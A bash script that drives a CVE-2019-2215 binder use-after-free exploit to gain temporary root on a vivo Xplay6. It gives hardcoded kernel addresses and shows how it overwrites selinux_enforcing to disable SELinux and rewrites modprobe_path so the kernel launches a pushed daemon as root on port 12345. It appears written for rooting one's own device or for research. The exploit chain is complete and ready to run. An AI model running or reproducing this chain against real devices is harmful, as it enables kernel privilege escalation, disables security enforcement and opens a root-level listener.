#!/usr/bin/env bash
# Memory-only temporary root for the vivo Xplay6 (PD1610 / msm8996, 3.18.20-perf,
# patch level 2016-11-01), driven end to end from an ordinary adb shell.
#
# Nothing is written to any partition. The whole effect is two RAM writes:
#   1. selinux_enforcing = 0                     (4 bytes)   -> getenforce Permissive
#   2. modprobe_path = "/data/local/tmp/rootsh"  (23 bytes)  -> kernel execs it as root
# Both are done with tools/clobber.c, a port of su98's clobber_data() for CVE-2019-2215:
# the freed binder_thread slot is refilled by the kernel's copy of my iovec array, the
# stale epoll wait entry's __list_del turns one segment's base/len into a kernel pointer,
# and the bytes fed through the pipe rewrite the descriptors the iterator has not reached
# yet -- so the payload lands at any address I name, with access_ok already passed at
# import time. A reboot removes all of it.
#
# usage: bash tools/run_temproot.sh [serial]
set -u
SER=${1:-3e5a38a5}
ADB="adb -s $SER"
DEV=/data/local/tmp
T="$(dirname "$0")"
SELINUX_ENFORCING=0xffffffc00189be74
MODPROBE_PATH=0xffffffc001635a30
# Which listener modprobe_path should point at.  rootsh is the original raw shell;
# sud is the one that carries the grant list, so DAEMON=sud is how the acceptance
# gate gets pointed at the new daemon.  Both bind 12345 -- only one should be
# running when the gate measures it (sud logs EADDRINUSE if it loses the port).
DAEMON=${DAEMON:-rootsh}
case "$DAEMON" in
	rootsh) DAEMON_SRC="$T/rootsh"; DAEMON_PATH='/data/local/tmp/rootsh'; PROOF=rootsh.ok ;;
	sud)    DAEMON_SRC="$T/sud";    DAEMON_PATH='/data/local/tmp/sudA';   PROOF=sud.ok ;;
	*) printf 'ABORT: DAEMON must be rootsh or sud\n' >&2; exit 1 ;;
esac
CLOBBER_ROUNDS=${CLOBBER_ROUNDS:-10}

fail() { printf 'ABORT: %s\n' "$*" >&2; exit 1; }
step() { printf '\n=== %s ===\n' "$*"; }

[ -x "$T/clobber" ] || fail "build tools/clobber first (missing $T/clobber)"
[ -x "$DAEMON_SRC" ] || fail "missing $DAEMON_SRC (the daemon modprobe_path will exec)"
[ -x "$T/mpp" ]     || fail "missing $T/mpp (the bad-magic execve trigger, from modprobe_probe.c)"

$ADB get-state >/dev/null 2>&1 || fail "device $SER not present"

step "0. baseline must be an unprivileged enforcing shell"
BASE=$($ADB shell 'id -u; getenforce' | tr -d '\r' | tr '\n' ' ')
printf 'plain shell: %s\n' "$BASE"

step "1. ship the payload (daemon=$DAEMON)"
$ADB push "$T/clobber" $DEV/clobber >/dev/null 2>&1 || fail "push clobber"
$ADB push "$DAEMON_SRC" "$DAEMON_PATH" >/dev/null 2>&1 || fail "push $DAEMON"
$ADB push "$T/mpp"     $DEV/mpp     >/dev/null 2>&1 || fail "push mpp"
$ADB shell "chmod 0755 $DEV/clobber $DAEMON_PATH $DEV/mpp" >/dev/null

# One clobber batch is a race against the allocator, not a deterministic write: today the first batch
# missed twice in about ten attempts (readv returned, but the reclaimed slot was not the iovec copy).
# Retry the whole batch until the kernel's own state says the value landed.
kwrite() { # kwrite <tries> <addr> <payload> <verify-command> <wanted>
	local tries=$1 addr=$2 pay=$3 vcmd=$4 want=$5 got i
	for i in $(seq "$tries"); do
		$ADB shell "$DEV/clobber $CLOBBER_ROUNDS kern $addr $pay 4 0" 2>&1 |
			grep -E "RESULT|no hit" | tail -1 | sed 's/^/    try '"$i"': /'
		got=$($ADB shell "$vcmd" 2>/dev/null | tr -d '\r')
		[ "$got" = "$want" ] && return 0
		sleep 1
	done
	printf '  last read: %s (wanted %s)\n' "$got" "$want"
	return 1
}

step "2. write selinux_enforcing = 0 (4 bytes)"
if [ "$($ADB shell getenforce | tr -d '\r')" = "Permissive" ]; then
	printf '  already Permissive, skipping\n'
else
	kwrite 3 "$SELINUX_ENFORCING" hex:00000000 getenforce Permissive ||
		fail "getenforce did not become Permissive"
fi
printf '  getenforce = %s\n' "$($ADB shell getenforce | tr -d '\r')"

step "3. write modprobe_path = $DAEMON_PATH"
NOW=$($ADB shell cat /proc/sys/kernel/modprobe 2>/dev/null | tr -d '\r')
printf '  before: %s\n' "$NOW"
if [ "$NOW" != "$DAEMON_PATH" ]; then
	kwrite 3 "$MODPROBE_PATH" "str:$DAEMON_PATH" 'cat /proc/sys/kernel/modprobe' "$DAEMON_PATH" ||
		fail "modprobe_path not rewritten"
	printf '  after:  %s\n' "$($ADB shell cat /proc/sys/kernel/modprobe 2>/dev/null | tr -d '\r')"
fi

step "4. trigger: execve of a file with no binary magic"
$ADB shell "rm -f $DEV/$PROOF; $DEV/mpp" 2>&1 | grep -E "execve|stat /sbin" || true
for i in 1 2 3 4 5 6; do
	sleep 2
	$ADB shell "netstat -ltn 2>/dev/null | grep -q :12345" && { printf '  listener up after %ds\n' $((i * 2)); break; }
	[ "$i" = 6 ] && fail "$DAEMON never came up (no listener on 12345)"
done
$ADB shell "cat $DEV/$PROOF" 2>&1 | sed -n '1,3p'

step "5. acceptance gate (criteria 1-4)"
bash "$T/verify_root.sh" "$SER"
printf '\nreversibility is NOT claimed by this script: reboot the phone, then run\n'
printf '  POST_REBOOT=1 bash tools/verify_root.sh   (must show uid 2000 + Enforcing)\n'
printf 'and re-run this script from the fresh boot to show the chain is repeatable.\n'
